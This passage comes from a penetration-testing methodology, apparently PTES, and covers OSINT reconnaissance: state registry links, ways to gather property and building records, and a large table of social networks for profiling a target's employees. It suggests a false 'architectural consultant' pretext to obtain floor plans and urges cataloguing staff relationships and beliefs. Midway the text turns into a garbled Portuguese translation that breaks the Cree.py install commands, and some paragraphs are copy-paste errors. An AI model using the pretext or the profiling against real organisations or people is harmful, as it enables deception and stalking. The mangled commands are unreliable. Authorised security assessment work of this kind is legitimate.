|Idaho |<http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep=crit>|
|Illinois |<http://www.ilsos.gov/corporatellc>|
|Indiana |<http://secure.in.gov/sos/bus_service/online_corps/default.asp>|
|Iowa |[http://www.state.ia.us](http://www.state.ia.us/)|
|Kansas |<http://www.accesskansas.org/apps/corporations.html>|
|Kentucky |<http://ukcc.uky.edu/~vitalrec>|
|Louisiana |<http://www.sec.state.la.us/crpinq.htm>|
|Maine |<http://www.state.me.us/sos/cec/corp/ucc.htm>|
|Maryland |<http://sdatcert3.resiusa.org/ucc-charter>|
|Massachusetts |<http://ucc.sec.state.ma.us/psearch/default.asp>|
|Michigan |<http://www.cis.state.mi.us/bcs_corp/sr_corp.asp>|
|Minnesota |<http://www.state.mn.us/>|
|Mississippi |<http://www.sos.state.ms.us/busserv/corpsnap>|
|Missouri |[http://www.state.mo.us](http://www.state.mo.us/)|
|Montana |[http://sos.state.mt.us](http://sos.state.mt.us/)|
|Nebraska |<http://www.sos.state.ne.us/htm/UCCmenu.htm>|
|Nevada |<http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm>|
|New Hampshire |[http://www.state.nh.us](http://www.state.nh.us/)|
|New Jersey |<http://www.state.nj.us/treasury/revenue/searchucc.htm>|
|New Mexico |<http://www.sos.state.nm.us/UCC/UCCSRCH.HTM>|
|New York |<http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show>|
|North Carolina |<http://www.secstate.state.nc.us/research.htm>|
|North Dakota |<http://www.state.nd.us/sec>|
|Ohio |<http://serform.sos.state.oh.us/pls/report/report.home>|
|Oklahoma |<http://www.oklahomacounty.org/coclerk/ucc/default.asp>|
|Oregon |<http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login>|
|Pennsylvania |<http://www.dos.state.pa.us/DOS/site/default.asp>|
|Rhode Island |[http://155.212.254.78](http://155.212.254.78/)|
|South Carolina |<http://www.scsos.com/corp_search.htm>|
|South Dakota |[http://www.state.sd.us](http://www.state.sd.us/)|
|Tennessee |<http://www.state.tn.us/sos/service.htm>|
|Texas |<https://ourcpa.cpa.state.tx.us/coa/Index.html>|
|Utah |[http://www.commerce.state.ut.us](http://www.commerce.state.ut.us/)|
|Vermont |<http://www.sec.state.vt.us/seek/database.htm>|
|Virginia |[http://www.state.va.us](http://www.state.va.us/)|
|Washington |<http://www.dol.wa.gov/business/UCC/>|
|West Virginia |<http://www.wvsos.com/wvcorporations>|
|Wisconsin |<http://www.wdfi.org/corporations/crispix>|
|Wyoming |<http://soswy.state.wy.us/Corp_Search_Main.asp>|
#### **Physical**
Often the first step in OSINT is to identify the physical locations of the target corporation. This information might be readily available for publically known or published locations, but not quite so easy for more secretive sites. Public sites can often be location by using search engines such as: 

- Google -[http://www.google.com](http://www.google.com/)
- Yahoo - [http://yahoo.com](http://yahoo.com/)
- Bing - [http://www.bing.com](http://www.bing.com/)
- Ask.com - [http://ask.com](http://ask.com/)
##### **Locations**
##### **Shared/Individual**
As part of identifying the physical location it is important to note if the location is an individual building or simply a suite in a larger facility. It is important to attempt to identify neighboring businesses as well as common areas. 
##### **Owner**
Once the physical locations have been identified, it is useful to identify the actual property owner(s). This can either be an individual, group, or corporation. If the target corporation does not own the property then they may be limited in what they can physically do to enhance or improve the physical location. 
###### **Land/tax records**
Tax records: 

<http://www.naco.org/Counties/Pages/CitySearch.aspx>

Land and tax records generally include a wealth of information on a target such as ownership, possession, mortgage companies, foreclosure notices, photographs and more. The information recorded and level of transparency varies greatly by jurisdiction. Land and tax records within the United States are typically handled at the county level. 

To start, if you know the city or zipcode in which your target resides, use a site such as <http://publicrecords.netronline.com/> to determine which county that is in. Then switching over to Google you can use a query such as "XXXX county tax records", "XXXX county recording office" or "XXXX county assessor" and that should lead you to a searchable online database if one exists. If it does not exist, you can still call the county recording office and request that they fax you specific records if you have an idea of what you are looking for. 

Building department: 

For some assessments, it might make sense to go a step further and query the local building department for additional information. Depending on the city, the target's site might be under county or city jurisdiction. Typically that can be determined by a call to either entity. 

The building department generally has floor plans, old & current permits, tenant improvement information and other similar information on file. Buried in that information might be names of contracting firms, engineers, architects and more. All of which could be used with a tool such as SET. In most cases, a phone call will be required to obtain any of this information but most building departments are happy to hand it out to anyone who asks. 

Here is a possible pretext you could use to obtain floor plans: You could call up and say that you are an architectural consultant who has been hired to design a remodel or addition to the building and it would help the process go much smoother if you could get a copy of the original plans. 
#### **Datacenter Locations**
Identifying any target business data center locations via either the corporate website, public filings, land records or via a search engine can provide additional potential targets. 
##### **Time zones**
Identifying the time zones that the target operates in provides valuable information regarding the hours of operation. It is also significant to understand the relationship between the target time zone and that of the assessment team. A time zone map is often useful as a reference when conducting any test. 


[TimeZone Map](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_02.png "Arquivo:Execução de teste de penetração 02.png")
##### **Offsite gathering**
Identifying any recent or future offsite gatherings or parties via either the corporate website or via a search engine can provide valuable insight into the corporate culture of a target. It is often common practice for businesses to have offsite gatherings not only for employees, but also for business partners and customers. Collecting this data could provide insight into potential items of interest to an attacker. 
##### **Product/Services**
Identifying the target business products and any significant data related to such launches via the corporate website, new releases or via a search engine can provide valuable insight into the internal workings of a target. It is often common practice for businesses to make such notifications publicly in an effort to garner publicity and to inform current and/or new customers of the launch. Publicly available information includes, but is not limited to, foreign language documents, radio and television broadcasts, Internet sites, and public speaking. 
##### **Company Dates**
Significant company dates can provide insight into potential days where staff may be on alert higher than normal. This could be due to potential corporate meetings, board meetings, investor meetings, or corporate anniversary. Normally, businesses that observe various holidays have a significantly reduced staff and therefore targeting may prove to be much more difficult during these periods. 
##### **Position identification**
Within every target it is critical that you identify and document the top positions within the organization. This is critical to ensure that the resulting report is targeting the correct audience. At a minimum, key employees should be identified as part of any engagement. 
##### **Organizational Chart**
Understanding the organizational structure is important, not only to understand the depth of the structure, but also the breadth. If the organization is extremely large, it is possible that new staff or personnel could go undetected. In smaller organizations, the likelihood is not as great. Getting a good picture of this structure can also provide insight into the functional groups. This information can be useful in determining internal targets. 
##### **Corporate Communications**
Identifying corporate communications either via the corporate website or a job search engine can provide valuable insight into the internal workings of a target. 
###### **Marketing**
Marketing communications are often used to make corporate announcements regarding currently, or future product releases, and partnerships. 
###### **Lawsuits**
Communications regarding the targets involvement in litigation can provide insight into potential threat agent or data of interest. 
###### **Transactions**
Communications involving corporate transactions may be indirect response to a marketing announcement or lawsuit. 
##### **Job openings**
Searching current job openings or postings via either the corporate website or via a job search engine can provide valuable insight into the internal workings of a target. It is often common practice to include information regarding currently, or future, technology implementations. Collecting this data could provide insight into potential items of interest to an attacker. Several Job Search Engines exist that can be queried for information regarding the target. 

|**Site**|**URL**|
| :- | :- |
|Monster |[http://www.monster.com](http://www.monster.com/)|
|CareerBuilder |[http://www.careerbuilder.com](http://www.careerbuilder.com/)|
|Computerjobs.com |[http://www.computerjobs.com](http://www.computerjobs.com/)|
|Craigslist |[http://www.craigslist.org/about/sites](http://www.craigslist.org/about/sites/)|
#### **Relationships**
Identifying the targets logical relationships is critical to understand more about how the business operates. Publicly available information should be leveraged to determine the target business relationship with vendors, business partners, law firms, etc. This is often available via news releases, corporate web sites (target and vendors), and potentially via industry related forums. 
##### **Charity Affiliations**
Identifying any target business charity affiliations via either the corporate website or via a search engine can provide valuable insight into the internal workings and potentially the corporate culture of a target. It is often common practice for businesses to make charitable donations to various organizations. Collecting this data could provide insight into potential items of interest to an attacker. 
##### **Network Providers**
Identifying any network provisioning or providers either via the allocated netblock /address information, corporate website or via a search engine can provide valuable insight into the potentially of a target. It is often common practice for businesses to make charitable donations to various organizations. Collecting this data could provide insight into potential items of interest to an attacker. 
##### **Business Partners**
Identifying business partners is critical to gaining insight into not only the corporate culture of a target, but also potentially technologies being used. It is often common practice for businesses to announce partnership agreements. Collecting this data could provide insight into potential items of interest to an attacker. 
##### **Competitors**
Identifying competitors can provide a window into potential adversaries. It is not uncommon for competitors to announce news that could impact the target. These could range from new hires, product launches, and even partnership agreements. Collecting this data is important to fully understand any potential corporate hostility. 
### **Individuals**
###### **Social Networking Profile**
The numbers of active Social Networking websites as well as the number of users make this a prime location to identify employee's friendships, kinships, common interest, financial exchanges, likes/dislikes, sexual relationships, or beliefs. It is even possible to determine an employee's corporate knowledge or prestige. 
###### **Social Networking Websites**

|**Name**|**URL**|**Description/Focus**|
| :- | :- | :- |
|Academia.edu |[http://www.academia.edu](http://www.academia.edu/)|Social networking site for academics/researchers |
|Advogato |[http://www.advogato.org](http://www.advogato.org/)|Free and open source software developers |
|aNobii |<http://www.anobii.com/anobii_home>|Books |
|aSmallWorld |[http://www.asmallworld.net](http://www.asmallworld.net/)|European jet set and social elite world-wide |
|AsianAvenue |[http://www.asianave.com](http://www.asianave.com/)|A social network for the Asian American community |
|Athlinks |[http://www.athlinks.com](http://www.athlinks.com/)|Open Running, Swimming |
|Audimated.com |[http://www.audimated.com](http://www.audimated.com/)|Independent Music |
|Avatars United |[http://www.avatarsunited.com](http://www.avatarsunited.com/)|Online games |
|Badoo |[http://badoo.com](http://badoo.com/)|General, Meet new people, Popular in Europe and LatAm |
|Bebo |[http://www.bebo.com](http://www.bebo.com/)|General |
|Bigadda |[http://bigb.bigadda.com](http://bigb.bigadda.com/)|Indian Social Networking Site |
|Federated Media's BigTent |[http://www.federatedmedia.net](http://www.federatedmedia.net/)|Organization and communication portal for groups |
|Biip.no |[http://www.biip.no](http://www.biip.no/)|Norwegian community |
|BlackPlanet |[http://www.blackplanet.com](http://www.blackplanet.com/)|African-Americans |
|Blauk |[http://blauk.com](http://blauk.com/)|Anyone who wants to tell something about a stranger or acquaintance. |
|Blogster |[http://www.blogster.com](http://www.blogster.com/)|Blogging community |
|Bolt.com |[http://www.bolt.com](http://www.bolt.com/)|General |
|Buzznet |[http://www.buzznet.com](http://www.buzznet.com/)|Music and pop-culture |
|CafeMom |[http://www.cafemom.com](http://www.cafemom.com/)|Mothers |
|Cake Financial |[http://www.cakefinancial.com](http://www.cakefinancial.com/)|Investing |
|Care2 |[http://www.care2.com](http://www.care2.com/)|Green living and social activism |
|CaringBridge |[http://www.caringbridge.org](http://www.caringbridge.org/)|Not for profit providing free websites that connect family and friends during a serious health event, care and recovery. |
|Cellufun |[http://m.cellufun.com](http://m.cellufun.com/)|Mobile social game network, Number 8 US mobile website |
|Classmates.com |[http://www.classmates.com](http://www.classmates.com/)|School, college, work and the military |
|Cloob |[http://www.cloob.com](http://www.cloob.com/)|General. Popular in Iran |
|CouchSurfing |[http://www.couchsurfing.org](http://www.couchsurfing.org/)|Worldwide network for making connections between travelers and the local communities they visit. |
|CozyCot |[http://www.cozycot.com](http://www.cozycot.com/)|East Asian and Southeast Asian women |
|Cross.tv |[http://www.cross.tv](http://www.cross.tv/)|Faith Based social network for Christian believers from around the world |
|Crunchyroll |[http://www.crunchyroll.com](http://www.crunchyroll.com/)|Anime and forums. |
|Cyworld |(Korea) [http://cyworld.co.kr](http://cyworld.co.kr/) <br>(China) [http://www.cyworld.com.cn](http://www.cyworld.com.cn/)|General. Popular in South Korea. |
|DailyBooth |[http://dailybooth.com](http://dailybooth.com/)|Photo-blogging site where users upload a photo every day |
|DailyStrength |[http://www.dailystrength.org](http://www.dailystrength.org/)|Medical & emotional support community - Physical health, Mental health, Support groups |
|Decayenne |[http://www.decayenne.com](http://www.decayenne.com/)|European and American social elite |
|delicious |[http://www.delicious.com](http://www.delicious.com/)|Social bookmarking allowing users to locate and save websites that match their own interests |
|deviantART |[http://www.deviantart.com](http://www.deviantart.com/)|Art community |
|Disaboom |[http://www.disaboom.com](http://www.disaboom.com/)|People with disabilities (Amputee, cerebral palsy, MS, and other disabilities) |
|Dol2day |[http://www.dol2day.de](http://www.dol2day.de/)|Politic community, Social network, Internet radio (German-speaking countries) |
|DontStayIn |[http://www.dontstayin.com](http://www.dontstayin.com/)|Clubbing (primarily UK) |
|Draugiem.lv |[http://www.draugiem.lv](http://www.draugiem.lv/)|General (primarily LV, LT, HU) |
|douban |[http://www.douban.com](http://www.douban.com/)|Chinese Web 2.0 website providing user review and recommendation services for movies, books, and music. It is also the largest online Chinese language book, movie and music database and one of the largest online communities in China. |
|Elftown |[http://www.elftown.com](http://www.elftown.com/)|Community and wiki around Fantasy and sci-fi. |
|Entitycube |[http://entitycube.research.microsoft.com](http://entitycube.research.microsoft.com/)|  |
|Eons.com |[http://www.eons.com](http://www.eons.com/)|For baby boomers |
|Epernicus |[http://www.epernicus.com](http://www.epernicus.com/)|For research scientists |
|Experience Project |[http://www.experienceproject.com](http://www.experienceproject.com/)|Life experiences |
|Exploroo |[http://www.exploroo.com](http://www.exploroo.com/)|Travel Social Networking. |
|Facebook |(IPv4) [http://www.facebook.com](http://www.facebook.com/)<br>(IPv6) [http://www.v6.facebook.com](http://www.v6.facebook.com/)|General. |
|Faceparty |[http://www.faceparty.com](http://www.faceparty.com/)|General. Popular UK. |
|Faces.com |[http://www.face-pic.com](http://www.face-pic.com/)<br>[http://www.faces.com](http://www.faces.com/)|British teens |
|Fetlife |[http://fetlife.com](http://fetlife.com/)|People who are into BDSM |
|FilmAffinity |[http://www.filmaffinity.com](http://www.filmaffinity.com/)|Movies and TV Series |
|FitFinder |[http://www.thefitfinder.co.uk](http://www.thefitfinder.co.uk/)|Anonymous UK Student Microblogging Website |
|FledgeWing |[http://www.fledgewing.com](http://www.fledgewing.com/)|Entrepreneural community targeted towards worldwide university students |
|Flixster |[http://www.flixster.com](http://www.flixster.com/)|Movies |
|Flickr |[http://www.flickr.com](http://www.flickr.com/)|Photo sharing, commenting, photography related networking, worldwide |
|Focus.com |[http://www.focus.com](http://www.focus.com/)|Business to Business, worldwide |
|Folkdirect |[http://www.folkdirect.com](http://www.folkdirect.com/)|General |
|Fotki |[http://www.fotki.com](http://www.fotki.com/)|Photo sharing, video hosting, photo contests, journals, forums, flexible privacy protection, friend's feed, audio comments and unlimited custom design integration. |
|Fotolog |[http://www.fotolog.com](http://www.fotolog.com/)|Photoblogging. Popular in South America and Spain |
|Foursquare |[http://foursquare.com](http://foursquare.com/)|Location based mobile social network |
|Friends Reunited |[http://www.friendsreunited.com](http://www.friendsreunited.com/)|UK based. School, college, work, sport and streets |
|Friendster |[http://www.friendster.com](http://www.friendster.com/)|General. Popular in Southeast Asia. No longer popular in the western world |
|Fr¸hst¸ckstreff |[http://www.fruehstueckstreff.de](http://www.fruehstueckstreff.de/)|General |
|Fubar |[http://www.fubar.com](http://www.fubar.com/)|dating, an "online bar" for 18 and older |
|Gaia Online |[http://www.gaiaonline.com](http://www.gaiaonline.com/)|Anime and games. Popular in USA, Canada and Europe. Moderately popular around Asia. |
|GamerDNA |[http://www.gamerdna.com](http://www.gamerdna.com/)|Computer and video games |
|Gather.com |[http://home.gather.com](http://home.gather.com/)|Article, picture, and video sharing, as well as group discussions |
|Gays.com |[http://gays.com](http://gays.com/)|Social network for LGBT community, Guide for LGBT bars, restaurants, clubs, shopping |
|Geni.com |[http://www.geni.com](http://www.geni.com/)|Families, genealogy |
|Gogoyoko |[http://www.gogoyoko.com](http://www.gogoyoko.com/)|Fair play in Music - Social networking site for musicians and music lovers |
|Goodreads |[http://www.goodreads.com](http://www.goodreads.com/)|Library cataloging, book lovers |
|Goodwizz |[http://www.goodwizz.com](http://www.goodwizz.com/)|Social network with matchmaking and personality games to find new contacts. Global, based in France. |
|Google Buzz |<http://www.google.com/buzz>|General |
|Google+ |[http://plus.google.com](http://plus.google.com/)|General |
|GovLoop |[http://www.govloop.com](http://www.govloop.com/)|For people in and around government |
|Gowalla |[http://gowalla.com](http://gowalla.com/)|  |
|Grono.net |[http://grono.net](http://grono.net/)|Poland |
|Habbo |[http://www.habbo.com](http://www.habbo.com/)|General for teens. Over 31 communities worldwide. Chat Room and user profiles. |
|hi5 |[http://hi5.com](http://hi5.com/)|General. Popular in India, Mongolia, Thailand, Romania, Jamaica, Central Africa, Portugal and Latin America. Not very popular in the USA. |
|Hospitality Club |[http://www.hospitalityclub.org](http://www.hospitalityclub.org/)|Hospitality |
|Hotlist |[http://www.thehotlist.com](http://www.thehotlist.com/)|Geo-Social Aggregator rooted in the concept of knowing where your friends are, were, and will be. |
|HR.com |[http://www.hr.com](http://www.hr.com/)|Social networking site for Human Resources professionals |
|Hub Culture |[http://www.hubculture.com](http://www.hubculture.com/)|Global influencers focused on worth creation |
|Hyves |[http://www.hyves.nl](http://www.hyves.nl/)|General, Most popular in the Netherlands. |
|Ibibo |[http://www.ibibo.com](http://www.ibibo.com/)|Talent based social networking site that allows to promote one's self and also discover new talent. Most popular in India. |
|Identi.ca |[http://identi.ca](http://identi.ca/)|Twitter-like service popular with hackers and software freedom advocates. |
|Indaba Music |[http://www.indabamusic.com](http://www.indabamusic.com/)|Online collaboration for musicians, remix contests, and networking. |
|IRC-Galleria |[http://www.irc-galleria.net](http://www.irc-galleria.net/)|Finland |
|italki.com |[http://www.italki.com](http://www.italki.com/)|Language learning social network. 100+ languages. |
|InterNations |[http://www.internations.org](http://www.internations.org/)|International community |
|Itsmy |[http://mobile.itsmy.com](http://mobile.itsmy.com/)|Mobile community worldwide, blogging, friends, personal TV-shows |
|iWiW |[http://iwiw.hu](http://iwiw.hu/)|Hungary |
|Jaiku |[http://www.jaiku.com](http://www.jaiku.com/)|General. Microblogging. Owned by Google |
|JammerDirect.com |[http://www.jammerdirect.com](http://www.jammerdirect.com/)|Network for unsigned artists |
|kaioo |[http://www.kaioo.com](http://www.kaioo.com/)|General, nonprofit |
|Kaixin001 |[http://www.kaixin001.com](http://www.kaixin001.com/)|General. In Simplified Chinese; caters for mainland China users |
|Kiwibox |[http://www.kiwibox.com](http://www.kiwibox.com/)|General. For the users, by the users, a social network that is more than a community. |
|Lafango |[http://lafango.com](http://lafango.com/)|Talent-Focused media sharing site |
|Last.fm |[http://www.last.fm](http://www.last.fm/)|Music |
|LibraryThing |<http://www.librarything.com/><br>(German) [http://www.librarything.de](http://www.librarything.de/)|Book lovers |
|Lifeknot |[http://www.lifeknot.com](http://www.lifeknot.com/)|Shared interests, hobbies |
|LinkedIn |[http://www.linkedin.com](http://www.linkedin.com/)|Business and professional networking |
|LinkExpats |[http://www.linkexpats.com](http://www.linkexpats.com/)|Social networking website for expatriates. 100+ countries. |
|Listography |[http://listography.com](http://listography.com/)|Lists. Autobiography |
|LiveJournal |[http://www.livejournal.com](http://www.livejournal.com/)|Blogging. Popular in Russia and among the Russian-speaking diaspora abroad. |
|Livemocha |[http://www.livemocha.com](http://www.livemocha.com/)|Online language learning - dynamic online courses in 35 languages - world's largest community of native language speakers. |
|LunarStorm |[http://www.lunarstorm.se](http://www.lunarstorm.se/)|Sweden |
|MEETin |[http://www.meetin.org](http://www.meetin.org/)|General |
|Meetup.com |[http://www.meetup.com](http://www.meetup.com/)|General. Used to plan offline meetings for people interested in various activities |
|Meettheboss |[http://www.meettheboss.tv](http://www.meettheboss.tv/)|Business and Finance community, worldwide. |
|Mixi |[http://www.mixi.jp](http://www.mixi.jp/)|Japan |
|mobikade |[http://www.mkade.com](http://www.mkade.com/)|mobile community, UK only |
|MocoSpace |[http://www.mocospace.com](http://www.mocospace.com/)|mobile community, worldwide |
|MOG |[http://www.mog.com](http://www.mog.com/)|Music |
|MouthShut.com |[http://www.mouthshut.com](http://www.mouthshut.com/)|Social Network, social media, consumer reviews |
|Mubi (website) |[http://mubi.com](http://mubi.com/)|Auteur cinema |
|Multiply |[http://multiply.com](http://multiply.com/)|Real world relationships. Popular in primarily in Asia. |
|Muxlim |[http://muxlim.com](http://muxlim.com/)|Muslim portal site |
|MyAnimeList |[http://www.myanimelist.net](http://www.myanimelist.net/)|Anime themed social community |
|MyChurch |[http://www.mychurch.org](http://www.mychurch.org/)|Christian Churches |
|MyHeritage |[http://www.myheritage.com](http://www.myheritage.com/)|family-oriented social network service |
|MyLife |[http://www.mylife.com](http://www.mylife.com/)|Locating friends and family, keeping in touch (formerly Reunion.com) |
|My Opera |[http://my.opera.com](http://my.opera.com/)|Blogging, mobile blogging, photo sharing, connecting with friends, Opera Link and Opera Unite. Global |
|Myspace |[http://www.myspace.com](http://www.myspace.com/)|General |
|myYearbook |[http://www.myyearbook.com](http://www.myyearbook.com/)|General, Charity |
|Nasza-klasa.pl |[http://www.nk.pl](http://www.nk.pl/)|School, college and friends. Popular in Poland |
|Netlog |[http://www.netlog.com](http://www.netlog.com/)|General. Popular in Europe, Turkey, the Arab World and Canada's QuÈbec province. Formerly known as Facebox and Redbox. |
|Nettby |[http://www.nettby.no](http://www.nettby.no/)|Norwegian Community |
|Nexopia |[http://www.nexopia.com](http://www.nexopia.com/)|Canada |
|NGO Post |[http://www.ngopost.org](http://www.ngopost.org/)|Non-Profit news sharing and networking, mainly in India |
|Ning |[http://www.ngopost.org](http://www.ngopost.org/)|Users create their own social websites and social networks |
|Odnoklassniki |[http://odnoklassniki.ru](http://odnoklassniki.ru/)|Connect with old classmates. Popular in Russia and former Soviet republics |
|OneClimate |[http://www.oneclimate.net](http://www.oneclimate.net/)|Not for Profit Social networking and Climate Change |
|OneWorldTV |[http://tv.oneworld.net](http://tv.oneworld.net/)|Not for Profit Video sharing and social networking aimed at people interested in social issues, development, environment, etc. |
|Open Diary |[http://www.opendiary.com](http://www.opendiary.com/)|First online blogging community, founded in 1998 |
|Orkut |[http://orkut.com](http://orkut.com/)|General. Owned by Google Inc. Popular in India and Brazil. |
|OUTeverywhere |[http://www.outeverywhere.com](http://www.outeverywhere.com/)|Gay/LGBTQ Community |
|Passportstamp |[http://www.passportstamp.com](http://www.passportstamp.com/)|Travel |
|Partyflock |[http://partyflock.nl](http://partyflock.nl/)|Dutch virtual community for people interested in house music and other electronic dance music. Since 2001, Partyflock has evolved into the biggest online community for the dance scene in the Netherlands |
|Picasa |[http://picasa.google.com](http://picasa.google.com/)|  |
|PicFog |[http://picfog.com](http://picfog.com/)|PicFog shows pictures from twitter *as* they're posted |
|Pingsta |[http://www.pingsta.com](http://www.pingsta.com/)|Collaborative platform for the world's Internetwork Experts |
|Plaxo |[http://www.plaxo.com](http://www.plaxo.com/)|Aggregator |
|Playahead |[http://www.playahead.se](http://www.playahead.se/)|Swedish, Danish teenagers |
|Playlist.com |[http://www.playlist.com](http://www.playlist.com/)|General, Music |
|Plurk |[http://www.plurk.com](http://www.plurk.com/)|Micro-blogging, RSS, updates. Very popular in Taiwan |
|Present.ly |[http://www.presently.com](http://www.presently.com/)|Enterprise social networking and micro-blogging |
|Qapacity |[http://www.qapacity.com](http://www.qapacity.com/)|A a business-oriented social networking site and a business directory |
|Quechup |[http://quechup.com](http://quechup.com/)|General, friendship, dating |
|Qzone |[http://qzone.qq.com](http://qzone.qq.com/)|General. In Simplified Chinese; caters for mainland China users |
|Raptr |[http://raptr.com](http://raptr.com/)|Video games |
|Ravelry |[http://www.ravelry.com](http://www.ravelry.com/)|Knitting and crochet |
|Renren |[http://renren.com](http://renren.com/)|Significant site in China. |
|ResearchGate |[http://researchgate.net](http://researchgate.net/)|Social network for scientific researchers |
|ReverbNation.com |[http://www.reverbnation.com](http://www.reverbnation.com/)|Social network for musician and bands |
|Ryze |[http://www.ryze.com](http://www.ryze.com/)|Business |
|ScienceStage |[http://sciencestage.com](http://sciencestage.com/)|Science-oriented multimedia platform and network for scientists |
|Scispace.net |[http://scispace.net](http://scispace.net/)|Collaborative network site for scientists |
|ShareTheMusic |[http://www.sharethemusic.com](http://www.sharethemusic.com/)|Music Community. Sharing and listening to music for free and legally |
|Shelfari |[http://www.shelfari.com](http://www.shelfari.com/)|Books |
|Skyrock |[http://skyrock.com](http://skyrock.com/)|Social Network in French-speaking world |
|Social Life |[http://www.sociallife.com.br](http://www.sociallife.com.br/)|Brazilian jet set and social elite world-wide |
|SocialVibe |[http://www.socialvibe.com](http://www.socialvibe.com/)|Social Network for Charity |
|Sonico.com |[http://www.sonico.com](http://www.sonico.com/)|General. Popular in Latin America and Spanish and Portuguese speaking regions. |
|Stickam |[http://www.stickam.com](http://www.stickam.com/)|Live video streaming and chat. |
|StudiVZ |[http://www.studivz.net](http://www.studivz.net/)|University students, mostly in the German-speaking countries. School students and those out of education sign up via its partner sites sch¸lerVZ and meinVZ. |
|StumbleUpon |[http://www.stumbleupon.com](http://www.stumbleupon.com/)|Stumble through websites that match your selected interests |
|Tagged |[http://www.tagged.com](http://www.tagged.com/)|General. Subject to quite some controversy about its e-mail marketing and privacy policy |
|Talkbiznow |[http://www.talkbiznow.com](http://www.talkbiznow.com/)|Business networking |
|Taltopia |[http://www.taltopia.com](http://www.taltopia.com/)|Online artistic community |
|Taringa! |[http://www.taringa.net](http://www.taringa.net/)|General |
|TeachStreet |[http://www.teachstreet.com](http://www.teachstreet.com/)|Education / Learning / Teaching - More than 400 subjects |
|TravBuddy.com |[http://www.travbuddy.com](http://www.travbuddy.com/)|Travel |
|Travellerspoint |[http://www.travellerspoint.com](http://www.travellerspoint.com/)|Travel |
|tribe.net |[http://www.tribe.net](http://www.tribe.net/)|General |
|Trombi.com |[http://www.trombi.com](http://www.trombi.com/)|French subsidiary of Classmates.com |
|Tuenti |[http://www.tuenti.com](http://www.tuenti.com/)|Spanish-based university and High School social network. Very Popular in Spain |
|Tumblr |[http://www.tumblr.com](http://www.tumblr.com/)|General. Micro-blogging, RSS |
|Twitter |[http://twitter.com](http://twitter.com/)|General. Micro-blogging, RSS, updates |
|twitpic |[http://twitpic.com](http://twitpic.com/)|  |
|Vkontakte |<http://vkontakte.ru/>|Social Network for Russian-speaking world including former Soviet republics. Biggest site in Russia |
|Vampirefreaks.com |[http://www.vampirefreaks.com](http://www.vampirefreaks.com/)|Gothic and industrial subculture |
|Viadeo |[http://www.viadeo.com](http://www.viadeo.com/)|Global Social Networking and Campus Networking available in English, French, German, Spanish, Italian and Portuguese |
|Virb |[http://www.virb.com](http://www.virb.com/)|Social network that focuses heavily on artists, including musicians and photographers |
|Vox |[http://www.vox.com](http://www.vox.com/)|Blogging |
|Wakoopa |[http://social.wakoopa.com](http://social.wakoopa.com/)|Para fãs de informática que desejam descobrir novos softwares e jogos |
|Wattpad |[http://www.wattpad.com](http://www.wattpad.com/)|Para leitores e autores interagirem e compartilharem e-books |
|Wasabi |[http://www.wasabi.com](http://www.wasabi.com/)|Em geral. Com sede no Reino Unido. |
|CAMINHO |[http://www.wayn.com](http://www.wayn.com/)|Viagens e estilo de vida |
|WebBiografias |[http://www.webbiography.com](http://www.webbiographies.com/)|Genealogia e biografia |
|WeeWorld |[http://www.weeworld.com](http://www.weeworld.com/)|Adolescentes - 10 a 17 |
|NósNossaFamília |[http://www.weourfamily.com](http://www.weourfamily.com/)|Geral com ênfase em privacidade e segurança |
|Wer-kennt-wen |[http://www.wer-kennt-wen.de](http://www.wer-kennt-wen.de/)|Em geral |
|nós lemos |[http://weread.com](http://weread.com/)|Livros |
|Espaços do Windows Live |[http://spaces.live.com](http://spaces.live.com/)|Blogs (anteriormente MSN Spaces) |
|Terra mais sábia |[http://www.wisereart.org](http://www.wiserearth.org/)|Espaço comunitário online para o movimento de justiça social e ambiental |
|WordPress |[http://wordpress.org](http://wordpress.org/)|  |
|Amigos do Mundo |[http://www.worldfriends.tv](http://www.worldfriends.tv/)|  |
|Xanga |[http://www.xanga.com](http://www.xanga.com/)|Blogs e áreas "metropolitanas" |
|XING |[http://www.xing.com](http://www.xing.com/)|Negócios (principalmente Europa (Alemanha, Áustria, Suíça) e China) |
|Xt3 |[http://www.xt3.com](http://www.xt3.com/)|Rede social católica, criada após a Jornada Mundial da Juventude de 2008 |
|Yammer |[http://www.yammer.com](http://www.yammer.com/)|Redes sociais para colegas de escritório |
|Yelp, Inc. |[http://www.yelp.com](http://www.yelp.com/)|Revisão e conversa sobre empresas locais |
|Yfrog |[http://yfrog.com](http://yfrog.com/)|  |
|Vocêmeo |[http://youmeo.com](http://youmeo.com/)|Rede Social do Reino Unido (foco na portabilidade de dados) |
|Zoo.gr |[http://www.zoo.gr](http://www.zoo.gr/)|Ponto de encontro na Web grega |
|Zoopa |[http://zooppa.com](http://zooppa.com/)|Comunidade Online para Talentos Criativos (anfitriã de concursos de publicidade patrocinados por marcas) |

**Tom e Frequência**

Identificar o tom e a frequência das postagens de um funcionário pode ser um indicador crítico de um funcionário insatisfeito, bem como da aceitação corporativa das redes sociais. Embora seja demorado, é possível estabelecer o horário de trabalho e os períodos de férias do funcionário. 

**Consciência de localização**

A maioria dos sites de redes sociais oferece a capacidade de incluir informações de geolocalização nas postagens. Essas informações podem ser úteis para identificar exatamente onde a pessoa estava fisicamente localizada quando a postagem foi feita. Além disso, é possível que informações de geolocalização sejam incluídas em imagens enviadas para sites de redes sociais. É possível que o usuário seja experiente o suficiente para desligar isso, porém, às vezes é tão simples quanto ler uma postagem que indica exatamente onde ele está localizado. 
##### **Repugnante**
Cree.py é uma ferramenta Beta usada para automatizar a tarefa de coleta de informações do Twitter e também do FourSquare. Além disso, Cree.py pode coletar quaisquer dados de geolocalização do flickr, twitpic.com, yfrog.com, img.ly, plixi.com, twitrpix.com, foleext.com, shozu.com, pickhur.com, moby.to, twitsnaps.com e twitgoo.com. Cree.py é um aplicativo de coleta de inteligência de código aberto. Para instalar o Cree.py, você precisará adicionar um repositório ao seu /etc/apt/sources.list. 

echo "deb http://people.dsv.su.se/~kakavas/creepy/binary/" >> /etc/apt/sources.list

Atualizar lista de pacotes 

atualização do apt-get

Instalar assustador 

apt-get install assustador

[Interface Cree.py](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_03.png "Arquivo:Execução de teste de penetração 03.png")

